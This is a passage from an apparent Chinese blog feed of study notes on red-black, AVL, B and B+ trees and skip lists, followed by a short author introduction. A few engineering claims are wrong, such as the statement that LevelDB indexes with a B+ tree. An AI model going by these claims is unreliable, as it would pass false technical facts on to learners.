class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">原始结构：</span><br><span class="line">    C</span><br><span class="line">   /</span><br><span class="line">  B</span><br><span class="line"> /</span><br><span class="line">A</span><br><span class="line"></span><br><span class="line">右旋后：</span><br><span class="line">    B</span><br><span class="line">   / \</span><br><span class="line">  A   C</span><br></pre></td></tr></table></figure><p>通过这些旋转，可以动态调整树结构，使其保持平衡。</p><hr><h2 id="红黑树简介"><a href="#红黑树简介" class="headerlink" title="红黑树简介"></a>红黑树简介</h2><p>红黑树是自平衡的二叉查找树，它使用颜色和旋转来控制树的高度。</p><p>红黑树不是严格平衡的，但它能保证最长路径不会超过最短路径的两倍，因此效率稳定。</p><h3 id="红黑树的五个性质"><a href="#红黑树的五个性质" class="headerlink" title="红黑树的五个性质"></a>红黑树的五个性质</h3><ol><li>每个节点是红色或黑色。</li><li>根节点必须是黑色。</li><li>所有叶子节点（NIL 节点）是黑色。</li><li>如果一个节点是红色的，则它的两个子节点必须是黑色的（不能连续两个红色节点）。</li><li>从任意节点到其所有叶子节点的路径上，包含的黑色节点数量必须相同。</li></ol><p>这些性质共同保证了树的平衡性。</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>普通二叉查找树查找效率依赖于树高，可能退化成链表。</li><li>平衡二叉树通过旋转操作保持结构平衡，提升查找、插入、删除性能。</li><li>红黑树是一种宽松的平衡树，通过颜色约束加旋转来维持近似平衡。</li><li>红黑树是很多底层库和系统（如 Java TreeMap、C++ STL、Linux 内核）使用的高效结构。</li></ul><hr><h1 id="红黑树与-AVL-性能对比，如何选型"><a href="#红黑树与-AVL-性能对比，如何选型" class="headerlink" title="红黑树与 AVL 性能对比，如何选型"></a>红黑树与 AVL 性能对比，如何选型</h1><p>这是一个很实用、也很容易被误解的问题。我们来进行一次<strong>实事求是</strong>的对比，站在工程实践的角度，讲清楚 <strong>红黑树 vs AVL 树 的性能差异、适用场景、优缺点、如何选型</strong>。</p><hr><h2 id="红黑树与-AVL-树的核心差异"><a href="#红黑树与-AVL-树的核心差异" class="headerlink" title="红黑树与 AVL 树的核心差异"></a>红黑树与 AVL 树的核心差异</h2><table><thead><tr><th>比较点</th><th>AVL 树</th><th>红黑树</th></tr></thead><tbody><tr><td>平衡性</td><td>严格平衡（左右子树高度差 ≤ 1）</td><td>相对平衡（通过颜色规则控制）</td></tr><tr><td>插入效率</td><td>较慢，可能频繁旋转</td><td>较快，旋转次数更少</td></tr><tr><td>删除效率</td><td>更慢（容易失衡）</td><td>更快（更容忍不平衡）</td></tr><tr><td>查找效率</td><td>稍快（更矮更“紧凑”）</td><td>稍慢（更高一些）</td></tr><tr><td>实现复杂度</td><td>中等</td><td>略高，染色逻辑更麻烦</td></tr><tr><td>实际树高</td><td>log(n)，更低</td><td>最坏 2log(n)，略高但可接受</td></tr><tr><td>应用场景</td><td>查找密集</td><td>插入&#x2F;删除频繁</td></tr></tbody></table><hr><h2 id="时间复杂度对比（理论上相同）"><a href="#时间复杂度对比（理论上相同）" class="headerlink" title="时间复杂度对比（理论上相同）"></a>时间复杂度对比（理论上相同）</h2><table><thead><tr><th>操作</th><th>AVL</th><th>红黑树</th></tr></thead><tbody><tr><td>查找</td><td>O(log n)</td><td>O(log n)</td></tr><tr><td>插入</td><td>O(log n) + 最多 2 次旋转</td><td>O(log n) + 最多 3 次旋转 + 染色</td></tr><tr><td>删除</td><td>O(log n) + 最多 log n 次旋转</td><td>O(log n) + 最多 3 次旋转 + 染色</td></tr></tbody></table><p><strong>注意</strong>：红黑树旋转次数少于 AVL，是因为它更“宽松”地控制平衡。</p><hr><h2 id="为什么工程中更常用红黑树？"><a href="#为什么工程中更常用红黑树？" class="headerlink" title="为什么工程中更常用红黑树？"></a>为什么工程中更常用红黑树？</h2><h3 id="1-插入、删除性能更稳定"><a href="#1-插入、删除性能更稳定" class="headerlink" title="1. 插入、删除性能更稳定"></a>1. 插入、删除性能更稳定</h3><p>AVL 树插入删除操作中需要频繁调整结构（旋转），因为它追求高度的平衡性。虽然这保证了查找很快，但维护成本高。</p><p>红黑树采用更“保守”的平衡策略，调整动作较少，<strong>整体吞吐量更好</strong>。这在系统级开发中非常重要，比如操作系统、数据库、语言运行时。</p><h3 id="2-插入-删除频率高时，红黑树吞吐量优于-AVL"><a href="#2-插入-删除频率高时，红黑树吞吐量优于-AVL" class="headerlink" title="2. 插入&#x2F;删除频率高时，红黑树吞吐量优于 AVL"></a>2. 插入&#x2F;删除频率高时，红黑树吞吐量优于 AVL</h3><p>AVL树适合“读多写少”的场景，比如缓存系统。</p><p>红黑树适合“读写都频繁”的场景，比如内核调度、任务队列、映射表等。</p><hr><h2 id="实际案例对比"><a href="#实际案例对比" class="headerlink" title="实际案例对比"></a>实际案例对比</h2><h3 id="Java-TreeMap-TreeSet"><a href="#Java-TreeMap-TreeSet" class="headerlink" title="Java TreeMap &#x2F; TreeSet"></a>Java <code>TreeMap</code> &#x2F; <code>TreeSet</code></h3><ul><li>使用的是 <strong>红黑树</strong> 实现</li><li>原因：Java中集合类通常面对频繁插入和删除（如实时排序、排名等），红黑树性能更均衡</li></ul><h3 id="C-STL-的-std-map-std-set"><a href="#C-STL-的-std-map-std-set" class="headerlink" title="C++ STL 的 std::map &#x2F; std::set"></a>C++ STL 的 <code>std::map</code> &#x2F; <code>std::set</code></h3><ul><li>也使用的是 <strong>红黑树</strong></li><li>同样考虑的是泛型容器的插入&#x2F;删除复杂度</li></ul><h3 id="Linux-内核调度器-时间红黑树（RB-tree）"><a href="#Linux-内核调度器-时间红黑树（RB-tree）" class="headerlink" title="Linux 内核调度器 &#x2F; 时间红黑树（RB-tree）"></a>Linux 内核调度器 &#x2F; 时间红黑树（RB-tree）</h3><ul><li>使用的是红黑树（见 <code>include/linux/rbtree.h</code>）</li><li>因为调度器中的进程插入&#x2F;删除频繁，而查找不一定多，所以使用红黑树性能更佳</li></ul><hr><h2 id="什么时候选-AVL-树？"><a href="#什么时候选-AVL-树？" class="headerlink" title="什么时候选 AVL 树？"></a>什么时候选 AVL 树？</h2><p>虽然工程里红黑树更常见，但 <strong>AVL 并不是没用</strong>，它在以下场景下依然有价值：</p><ul><li>对查找性能要求极致，数据变动频率低的场景<ul><li>如<strong>内存索引、缓存服务、读密集型数据库</strong></li></ul></li><li>数据量适中，性能压力可控，希望保证查找时间始终最优</li></ul><p>比如：一个静态配置中心，你预先插入一些配置项，然后主要是查找访问。用 AVL 是合理的。</p><hr><h2 id="工程选型建议总结"><a href="#工程选型建议总结" class="headerlink" title="工程选型建议总结"></a>工程选型建议总结</h2><table><thead><tr><th>场景</th><th>推荐结构</th><th>原因</th></tr></thead><tbody><tr><td>查找频繁、插入删除极少</td><td>AVL</td><td>查找快，保持严格平衡</td></tr><tr><td>插入&#x2F;删除频繁，查找适中</td><td>红黑树</td><td>性能更均衡，旋转少</td></tr><tr><td>需要范围查询</td><td>B+树</td><td>存储系统常用结构（如数据库）</td></tr><tr><td>高并发环境下</td><td>并发跳表 &#x2F; 哈希表</td><td>红黑树&#x2F;AVL 不擅长并发控制</td></tr><tr><td>内核、调度系统</td><td>红黑树</td><td>插入&#x2F;删除频繁，吞吐量更重要</td></tr><tr><td>学术 &#x2F; 教学用</td><td>AVL</td><td>更容易推导、理解平衡原理</td></tr></tbody></table><hr><h2 id="总结一句话"><a href="#总结一句话" class="headerlink" title="总结一句话"></a>总结一句话</h2><p><strong>红黑树是工业界的主流选型，因为它在保持平衡和性能之间做了非常合理的权衡。</strong></p><p>而 AVL 更适合做“查找效率最优”的算法研究、教学或低变更场景。</p><h1 id="B树、B-树、跳表"><a href="#B树、B-树、跳表" class="headerlink" title="B树、B+树、跳表"></a>B树、B+树、跳表</h1><p>非常好，接下来我们进入数据库&#x2F;存储系统中常用的三种结构：<strong>B树、B+树、跳表</strong>，它们都是用于<strong>范围查找、批量排序、动态插入删除</strong>等复杂需求下的数据结构。</p><p>我会按这个顺序讲解：</p><ol><li><strong>先讲 B 树</strong>：基础结构，理解它是后续 B+ 树的前提</li><li><strong>再讲 B+ 树</strong>：数据库索引、文件系统最常用结构</li><li><strong>最后讲跳表</strong>：高性能内存结构，Redis 的最爱</li></ol><p>每一个我们都会涵盖：</p><ul><li>是什么（直观理解）</li><li>如何组织数据</li><li>查找&#x2F;插入&#x2F;删除怎么做</li><li>为什么它适合某类场景</li></ul><hr><h2 id="B-树（Balanced-Tree-多路平衡查找树）"><a href="#B-树（Balanced-Tree-多路平衡查找树）" class="headerlink" title="B 树（Balanced Tree &#x2F; 多路平衡查找树）"></a>B 树（Balanced Tree &#x2F; 多路平衡查找树）</h2><h3 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h3><p>B 树是一种<strong>多路搜索树</strong>，是对二叉搜索树的推广。每个节点不仅可以有两个子节点，而是可以有多个。<br>广泛用于<strong>磁盘存储、数据库索引结构</strong>中，因为它减少了磁盘读写次数。</p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li>每个节点最多有 <code>m-1</code> 个数据项，<code>m</code> 个子指针（m 是阶数）</li><li>所有节点的关键字保持有序</li><li>插入、删除后依然保持平衡</li><li>所有叶子节点在同一层（树高固定）</li></ul><h3 id="举例（以3阶-B-树为例）"><a href="#举例（以3阶-B-树为例）" class="headerlink" title="举例（以3阶 B 树为例）"></a>举例（以3阶 B 树为例）</h3><ul><li>一个节点最多 2 个键，最多有 3 个子节点</li><li>比如节点中有 [10, 20]，它的子树范围：<ul><li>子树1：小于 10</li><li>子树2：10~20</li><li>子树3：大于 20</li></ul></li></ul><h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><p>和二分查找类似：</p><ul><li>从根节点开始，在节点中查找关键字位置（可以使用二分）</li><li>找不到则沿对应子树向下</li></ul><p>时间复杂度为 O(log n)，<strong>但每一层“跨度大”，所以树的高度更低，查找更快</strong></p><h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><ul><li>找到插入位置，插入键</li><li>如果节点已满，就<strong>分裂节点</strong>，中间值“上提”到父节点</li><li>插入可能从叶子一路调整到根节点，最多增加一层高度</li></ul><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><ul><li>类似 BST，找到值删掉</li><li>如果节点删除后不满足最小关键字数量，就需要<strong>向兄弟借值或合并节点</strong></li><li>复杂度 O(log n)</li></ul><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><ul><li>MySQL 的 MyISAM 引擎使用的是 <strong>B 树索引</strong></li><li>适合中等范围查询、单点查找、插入删除都频繁的磁盘结构</li></ul><hr><h2 id="B-树（B-Tree-的增强版）"><a href="#B-树（B-Tree-的增强版）" class="headerlink" title="B+ 树（B Tree 的增强版）"></a>B+ 树（B Tree 的增强版）</h2><h3 id="是什么-1"><a href="#是什么-1" class="headerlink" title="是什么"></a>是什么</h3><p>B+ 树是 B 树的一个变种，<strong>所有值都存在叶子节点</strong>，非叶子节点只做“导航”。</p><p><strong>MySQL InnoDB、文件系统、LevelDB 等都使用 B+ 树作为索引结构。</strong></p><h3 id="和-B-树的区别"><a href="#和-B-树的区别" class="headerlink" title="和 B 树的区别"></a>和 B 树的区别</h3><table><thead><tr><th>特性</th><th>B 树</th><th>B+ 树</th></tr></thead><tbody><tr><td>数据存储</td><td>所有节点存数据</td><td>只有叶子节点存数据</td></tr><tr><td>内部节点</td><td>数据 + 导航</td><td>仅导航（索引）</td></tr><tr><td>查找路径</td><td>可提前终止</td><td>一定走到叶子节点</td></tr><tr><td>范围查询</td><td>差</td><td>强（叶子节点有链表）</td></tr></tbody></table><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><ul><li>所有叶子节点通过链表串起来，方便范围查询</li><li>非叶子节点只做索引，节省空间，<strong>扇出更高，树更矮</strong></li><li>结构更适合磁盘块对齐，减少 IO 次数</li></ul><h3 id="查找-1"><a href="#查找-1" class="headerlink" title="查找"></a>查找</h3><ul><li>和 B 树类似，但一定查到叶子节点才能拿到数据</li><li>路径更统一，便于实现</li></ul><h3 id="范围查询"><a href="#范围查询" class="headerlink" title="范围查询"></a>范围查询</h3><ul><li>特别高效，只需要找到范围起点，然后从链表顺着读下去即可</li></ul><h3 id="应用场景-1"><a href="#应用场景-1" class="headerlink" title="应用场景"></a>应用场景</h3><ul><li><strong>数据库索引（MySQL InnoDB）</strong></li><li><strong>文件系统（如 NTFS, XFS）</strong></li><li>批量范围读取、数据分页、高并发写场景</li></ul><hr><h2 id="跳表（Skip-List）"><a href="#跳表（Skip-List）" class="headerlink" title="跳表（Skip List）"></a>跳表（Skip List）</h2><h3 id="是什么-2"><a href="#是什么-2" class="headerlink" title="是什么"></a>是什么</h3><p>跳表是一种通过在链表上建立多级索引的方式实现快速查找的数据结构。</p><p>你可以理解为：<strong>链表 + 多层快速通道</strong>，是“概率化”实现的平衡树。</p><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><ul><li>底层是有序链表（维护所有元素）</li><li>每一层随机选取一些节点参与“快速通道”</li><li>每一层都是下一层的子集，最顶层最稀疏</li></ul><p>比如有 16 个节点，可能层结构像这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Level 3:      A --------- H</span><br><span class="line">Level 2:      A ---- E -- H -- M</span><br><span class="line">Level 1: A - B - C - D - E - F - G - H - I - ... - P</span><br></pre></td></tr></table></figure><h3 id="查找-2"><a href="#查找-2" class="headerlink" title="查找"></a>查找</h3><ul><li>从顶层开始，逐层往下，直到定位到目标位置</li><li>每次跳跃跨度大，大大加快查找速度</li></ul><p>平均时间复杂度：O(log n)</p><h3 id="插入-删除"><a href="#插入-删除" class="headerlink" title="插入 &#x2F; 删除"></a>插入 &#x2F; 删除</h3><ul><li>插入新节点后，按概率决定它会出现在多少层（比如 Redis 是1&#x2F;4 概率上升一层）</li><li>删除也是先找到节点，再清理所有层级中的引用</li></ul><p>时间复杂度：O(log n)</p><h3 id="应用场景-2"><a href="#应用场景-2" class="headerlink" title="应用场景"></a>应用场景</h3><ul><li><strong>Redis 的 zset（有序集合）使用跳表实现</strong></li><li>比树更容易实现，适合内存结构、并发场景</li><li>查找、插入、删除都非常高效</li><li>不需要复杂的旋转、维护，代码比平衡树更简单</li></ul><hr><h2 id="三者对比总结"><a href="#三者对比总结" class="headerlink" title="三者对比总结"></a>三者对比总结</h2><table><thead><tr><th>特性</th><th>B 树</th><th>B+ 树</th><th>跳表</th></tr></thead><tbody><tr><td>查找效率</td><td>O(log n)</td><td>O(log n)</td><td>O(log n)</td></tr><tr><td>插入&#x2F;删除</td><td>O(log n)</td><td>O(log n)</td><td>O(log n)（更简单）</td></tr><tr><td>是否适合磁盘</td><td>是</td><td>是（最佳）</td><td>否，适合内存</td></tr><tr><td>是否适合范围查询</td><td>一般</td><td>强（链表）</td><td>强（链表）</td></tr><tr><td>实现复杂度</td><td>中</td><td>中高</td><td>低（逻辑简单）</td></tr><tr><td>工程应用</td><td>MyISAM索引</td><td>InnoDB索引，文件系统</td><td>Redis zset、有序内存结构</td></tr></tbody></table><hr><h2 id="总结建议"><a href="#总结建议" class="headerlink" title="总结建议"></a>总结建议</h2><ul><li><strong>数据库磁盘索引</strong>：使用 B+ 树。查找、范围查询快，IO次数少，MySQL&#x2F;Oracle&#x2F;SQLite都用它。</li><li><strong>键值对内存结构（Redis）</strong>：用跳表。简单好用，查找&#x2F;插入性能稳定。</li><li><strong>老的存储结构或小范围索引</strong>：B 树也能用，但现在基本被 B+ 树取代。</li></ul><hr><h2 id="B树和B-树对比"><a href="#B树和B-树对比" class="headerlink" title="B树和B+树对比"></a>B树和B+树对比</h2><ul><li><strong>B树</strong> 和 <strong>B+树</strong> 都是自平衡的多路查找树，它们通过分支节点和数据节点组织数据，确保了对大规模数据的高效查找。</li><li><strong>B+树</strong> 相比于 <strong>B树</strong>，更加高效，特别是在 <strong>范围查询</strong> 和 <strong>顺序访问</strong> 上，因此在数据库和文件系统中，B+树的应用更加广泛。</li><li><strong>B树</strong> 适合需要 <strong>较少的范围查询</strong> 或 <strong>较均衡的查找操作</strong> 的场景，而 <strong>B+树</strong> 更适合 <strong>大规模数据存储、范围查询和顺序扫描</strong> 的场景。</li></ul><hr><h1 id="什么是-AVL-树？"><a href="#什么是-AVL-树？" class="headerlink" title="什么是 AVL 树？"></a>什么是 AVL 树？</h1><p><strong>AVL 树</strong> 是一种 <strong>自平衡的二叉查找树（Binary Search Tree, BST）</strong>，它的全称是：</p><p><strong>Adelson-Velsky and Landis Tree</strong><br>由两位苏联科学家在 1962 年提出，是世界上第一个自平衡二叉查找树。</p><hr><h2 id="AVL-树的核心特性"><a href="#AVL-树的核心特性" class="headerlink" title="AVL 树的核心特性"></a>AVL 树的核心特性</h2><h3 id="自平衡的定义"><a href="#自平衡的定义" class="headerlink" title="自平衡的定义"></a>自平衡的定义</h3><p>对于 <strong>树中的每一个节点</strong>，都必须满足：</p><p><strong>左子树和右子树的高度差 ≤ 1</strong></p><p>这个高度差我们称为该节点的 <strong>平衡因子（Balance Factor）</strong>，它的取值只能是：</p><ul><li>-1（右子树比左子树高一层）</li><li>0（左右等高）</li><li>+1（左子树比右子树高一层）</li></ul><p>一旦插入或删除节点后某个节点的平衡因子超过这个范围（比如变成了 2 或 -2），就需要<strong>通过旋转操作来恢复平衡</strong>。</p><hr><h2 id="为什么需要-AVL-树？"><a href="#为什么需要-AVL-树？" class="headerlink" title="为什么需要 AVL 树？"></a>为什么需要 AVL 树？</h2><p>普通的二叉查找树（BST）在最坏情况下会退化成链表，导致操作效率变为 O(n)。<br>而 AVL 树通过强制控制“平衡因子”，保持<strong>树高度为 O(log n)</strong>，确保：</p><ul><li>查找（Search）</li><li>插入（Insert）</li><li>删除（Delete）</li></ul><p>这些操作都能在对数时间内完成。</p><hr><h2 id="AVL-树的旋转操作"><a href="#AVL-树的旋转操作" class="headerlink" title="AVL 树的旋转操作"></a>AVL 树的旋转操作</h2><h3 id="单旋（Single-Rotation）"><a href="#单旋（Single-Rotation）" class="headerlink" title="单旋（Single Rotation）"></a>单旋（Single Rotation）</h3><ol><li><strong>右旋（Right Rotation）</strong><br>用于左子树过高（LL 失衡）</li><li><strong>左旋（Left Rotation）</strong><br>用于右子树过高（RR 失衡）</li></ol><h3 id="双旋（Double-Rotation）"><a href="#双旋（Double-Rotation）" class="headerlink" title="双旋（Double Rotation）"></a>双旋（Double Rotation）</h3><ol><li><strong>先左旋再右旋（Left-Right Rotation）</strong><br>用于插入到左子树的右子树（LR 型失衡）</li><li><strong>先右旋再左旋（Right-Left Rotation）</strong><br>用于插入到右子树的左子树（RL 型失衡）</li></ol><hr><h2 id="操作复杂度"><a href="#操作复杂度" class="headerlink" title="操作复杂度"></a>操作复杂度</h2><table><thead><tr><th>操作</th><th>时间复杂度</th></tr></thead><tbody><tr><td>查找</td><td>O(log n)</td></tr><tr><td>插入</td><td>O(log n)（可能旋转）</td></tr><tr><td>删除</td><td>O(log n)（可能多次旋转）</td></tr></tbody></table><p>AVL 树高度非常低，接近 log₂(n)，因此查找性能极优。</p><hr><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>假设我们依次插入以下节点：10 → 20 → 30</p><p>普通 BST 结构变成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">  \</span><br><span class="line">   20</span><br><span class="line">     \</span><br><span class="line">      30</span><br></pre></td></tr></table></figure><p>此时树高度为 3，已经失衡，AVL 会做一次左旋，变成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">20</span><br><span class="line">   /  \</span><br><span class="line">  10  30</span><br></pre></td></tr></table></figure><p>保持了平衡。</p><hr><h2 id="AVL-树-vs-红黑树"><a href="#AVL-树-vs-红黑树" class="headerlink" title="AVL 树 vs 红黑树"></a>AVL 树 vs 红黑树</h2><table><thead><tr><th>对比项</th><th>AVL 树</th><th>红黑树</th></tr></thead><tbody><tr><td>平衡程度</td><td>更严格（左右子树高差 ≤ 1）</td><td>较宽松（限制黑节点数目）</td></tr><tr><td>插入&#x2F;删除效率</td><td>较慢，旋转多</td><td>较快，旋转少</td></tr><tr><td>查找效率</td><td>稍快</td><td>稍慢</td></tr><tr><td>实际应用</td><td>内存查找、读多写少</td><td>系统结构、写操作多</td></tr><tr><td>实现复杂度</td><td>中</td><td>高</td></tr></tbody></table><hr><h2 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h2><ul><li>查找频率高，插入&#x2F;删除少的场景，如内存中的索引结构</li><li>不适合频繁更新的场景，因为每次插入&#x2F;删除都可能触发旋转</li></ul><hr><h1 id="B树与平衡二叉查找树的对比"><a href="#B树与平衡二叉查找树的对比" class="headerlink" title="B树与平衡二叉查找树的对比"></a>B树与平衡二叉查找树的对比</h1><table><thead><tr><th>特性</th><th><strong>B树</strong></th><th><strong>平衡二叉查找树（如 AVL 树、红黑树）</strong></th></tr></thead><tbody><tr><td><strong>适用场景</strong></td><td>大规模数据存储，尤其是磁盘存储；数据库索引，文件系统管理</td><td>内存中的动态数据存储，集合、映射、优先队列等</td></tr><tr><td><strong>树的结构</strong></td><td>多路树，每个节点有多个子节点</td><td>二叉树，每个节点最多有两个子节点</td></tr><tr><td><strong>查找性能</strong></td><td>O(log n)，但通常更适合磁盘存储，减少磁盘访问次数</td><td>O(log n)，在内存中查找非常高效</td></tr><tr><td><strong>节点大小</strong></td><td>每个节点包含多个键和多个子指针，适合减少磁盘访问次数</td><td>每个节点只包含一个键和最多两个子指针</td></tr><tr><td><strong>插入&#x2F;删除操作</strong></td><td>节点分裂&#x2F;合并，通常需要更复杂的操作来保持平衡</td><td>旋转操作，通过保持平衡因子来保证平衡</td></tr><tr><td><strong>支持范围查询</strong></td><td>非常高效，能够快速查找和遍历范围数据</td><td>支持范围查询，但对于大量范围查询不如 B 树高效</td></tr><tr><td><strong>内存与存储</strong></td><td>适合外存存储，能高效处理大量数据</td><td>适用于内存数据管理，数据规模适中，内存存储</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;快速回忆下大学的数据结构课， 这些看完， 大概下面这些能理解一点啦~&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;树&lt;/li&gt;
&lt;li&gt;二叉查找树&lt;/li&gt;
&lt;li&gt;完全二叉树&lt;/li&gt;
&lt;li&gt;平衡二叉树&lt;/li&gt;
&lt;li&gt;n叉树&lt;/li&gt;
&lt;li&gt;树的遍历&lt;/li&gt;
&lt;li&gt;B+树&lt;/l</summary>
      
    
    
    
    
    <category term="数据结构" scheme="https://lyi61pd.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>Hey, there~</title>
    <link href="https://lyi61pd.github.io/2025/03/18/%E4%BB%8B%E7%BB%8D/"/>
    <id>https://lyi61pd.github.io/2025/03/18/%E4%BB%8B%E7%BB%8D/</id>
    <published>2025-03-18T00:00:00.000Z</published>
    <updated>2025-07-30T03:40:55.100Z</updated>
    
    <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Hey, there~</p><p>使用的 <code>hexo</code> + <code>butterfly</code> 生成的静态页面,部署在 Github 个人主页</p><p>之后应该会记录一些自己的学习笔记</p><p>主要学习和工作方向是安全研发,但是目前工作内容很杂,因此记录的内容也会涉及不同的领域</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h1&gt;&lt;p&gt;Hey, there~&lt;/p&gt;
&lt;p&gt;使用的 &lt;code&gt;hexo&lt;/code&gt; + &lt;code&gt;butterfly&lt;/code&gt; 生成的静</summary>
      
    
    
    
    
    <category term="闲话" scheme="https://lyi61pd.github.io/tags/%E9%97%B2%E8%AF%9D/"/>
    
  </entry>
  
</feed>
